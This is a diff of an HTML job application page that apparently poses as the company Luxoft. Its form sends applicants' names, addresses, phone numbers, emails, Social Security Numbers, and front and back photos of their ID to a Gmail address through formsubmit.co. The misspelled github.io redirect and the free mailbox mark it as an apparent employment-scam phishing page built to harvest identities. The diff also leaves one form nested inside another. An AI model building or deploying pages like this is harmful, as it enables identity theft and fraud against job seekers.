@@ -12,17 +12,21 @@
         <h1>Apply to Join Luxoft</h1>
     </header>
     <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
-        <input type="text" name="Name" placeholder="Full Name" required />
-        <input type="text" name="Address" placeholder="Address" required />
-        <input type="tel" name="Phone" placeholder="Phone Number" required />
-        <input type="email" name="Email" placeholder="Email Address" required />
-        <input type="text" name="SSN" placeholder="Social Security Number" required />
-        <label>Upload ID (Front)</label>
-        <input type="file" name="ID_Front" accept="image/*" required />
-        <label>Upload ID (Back)</label>
-        <input type="file" name="ID_Back" accept="image/*" required />
-        <input type="hidden" name="_next" value="https://luxoftorganisation.github.io/thank-you.html" />
-        <button type="submit">Submit Application</button>
+        <section class="application">
+    <h2>Apply Now</h2>
+    <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_next" value="thankyou.html">
+      <input type="text" name="Name" placeholder="Full Name" required>
+      <input type="text" name="Address" placeholder="Address" required>
+      <input type="tel" name="Phone" placeholder="Phone Number" required>
+      <input type="email" name="Email" placeholder="Email Address" required>
+      <input type="text" name="SSN" placeholder="Social Security Number" required>
+      <label>Upload Photo ID e.g DL (Front):</label>
+      <input type="file" name="ID_Front" accept="image/*" required>
+      <label>Upload Photo ID e.g DL(Back):</label>
+      <input type="file" name="ID_Back" accept="image/*" required>
+      <button type="submit">Submit Application</button>
     </form>
+  </section>
 </body>
 </html>
